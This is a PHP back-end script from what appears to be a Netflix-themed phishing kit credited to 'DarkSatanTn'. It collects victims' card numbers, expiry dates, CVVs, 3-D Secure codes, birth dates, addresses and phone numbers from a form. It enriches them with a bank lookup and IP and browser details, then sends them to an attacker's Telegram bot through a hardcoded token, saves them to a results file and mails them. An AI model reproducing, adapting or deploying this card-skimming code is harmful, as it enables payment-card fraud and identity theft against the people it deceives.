<?php


session_start();
include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];

$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$thDSecure = $_SESSION['thDSecure'] = $_POST['thDSecure'];


$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$zipCod = $_SESSION['zipCod'] = $_POST['zipCod'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);



$yagmai .= '
     [+]━━━【💳 CC Bill】━━[+]
[🎂 D.O.B ]  = '.$_SESSION['birthdate'].'
[🗺 Addres ]  = '.$_SESSION['addres'].'
[🌎 City ]  = '.$_SESSION['City'].'
[🌍 State]  = '.$_SESSION['State'].'
[📮 zip Code]  = '.$_SESSION['zipCod'].'
[📞 Phone ]  = '.$_SESSION['phoneNumber'].'
     [+]━━━【💳 CC INFO】━━[+]
[👤 CardHolder Name]  = '.$_SESSION['NameOnCard'].'
[💳 CC Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ]   = '.$_SESSION['expdate'].'
[🔑 CVV ] = '.$_SESSION['Securitycode'].'
        [+]━━━━【💳 Bin】━━━[+] 
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand]= '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 Card Bill 】━━━━━━━━━━━━━━[+]
[🎂 D.O.B ]              = '.$_SESSION['birthdate'].'
[🗺 Addres ]             = '.$_SESSION['addres'].'
[🌍  City ]               = '.$_SESSION['City'].'
[🌎 State ]              = '.$_SESSION['State'].'
[📮 zip Code ]              = '.$_SESSION['zipCod'].'
[📞 Phone ]              = '.$_SESSION['phoneNumber'].'
[+]━━━━━━━━━━━━━━━━【💳 Card INFO 】━━━━━━━━━━━━━━[+]
[👤 CardHolder Name]    = '.$_SESSION['NameOnCard'].'
[💳 Credit Card Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ]       = '.$_SESSION['expdate'].'
[🔑 CVV ]               = '.$_SESSION['Securitycode'].'
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【By DarkSatanTn🖕🤡🖕】━━━━━━━━━━━━━━━━━[+]

';
$botToken="5040159519:AAFxWxiFFdKCyVlO6NhbFXXCbbiRlMEjhx8"; // Your Token Bot

$website="https://api.telegram.org/bot".$botToken;
$chatId="-1001951716516"; // Your Id 
$params=[
    'chat_id'=>$chatId, 
    'text'=>$yagmai,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
include("sand_email.php"); 




?>


